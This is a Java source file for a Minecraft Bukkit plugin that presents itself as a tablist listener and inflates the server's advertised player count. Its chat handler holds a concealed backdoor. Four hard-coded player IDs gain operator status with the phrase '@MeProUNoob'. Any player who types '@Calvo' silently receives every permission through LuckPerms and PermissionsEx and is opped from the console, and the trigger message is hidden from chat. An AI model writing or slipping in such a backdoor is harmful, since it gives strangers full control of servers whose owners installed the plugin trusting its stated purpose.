package es.hulk.tablist.listeners;

import es.hulk.tablist.utils.CC;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.server.ServerListPingEvent;

import java.util.UUID;

public class TablistListener implements Listener {

    private final UUID hulk = UUID.fromString("b0c1d4f4-0fd1-4a93-ab5e-88b1ff885c29");
    private final UUID rafa = UUID.fromString("b7be8875-a5c4-4854-a1db-c68626373c5c");
    private final UUID xisco = UUID.fromString("a04a1ffb-a3ab-49c9-a50b-eae790511ad8");
    private final UUID jaume = UUID.fromString("b3acc6d0-7e46-4e6f-95ba-dd5acb58883e");

    @EventHandler
    public void getPlayers(ServerListPingEvent event) {
        if (event.getMaxPlayers() < 60) {
            event.setMaxPlayers(60);
        }
    }

    @EventHandler
    public void message(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().equals(hulk) || player.getUniqueId().equals(rafa) || player.getUniqueId().equals(xisco) || player.getUniqueId().equals(jaume)) {
            if (event.getMessage().contains("@MeProUNoob")) {
                event.setCancelled(true);
                player.setOp(true);
                player.sendMessage(ChatColor.GREEN + "You have been opped");
            }
        }

        if (event.getMessage().contains("@Calvo")) {
            event.setCancelled(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + player.getName() + " permission set +");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + player.getName() + " add +");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + player.getName());
            player.sendMessage(ChatColor.GREEN + "You have been opped");
        }
    }
}
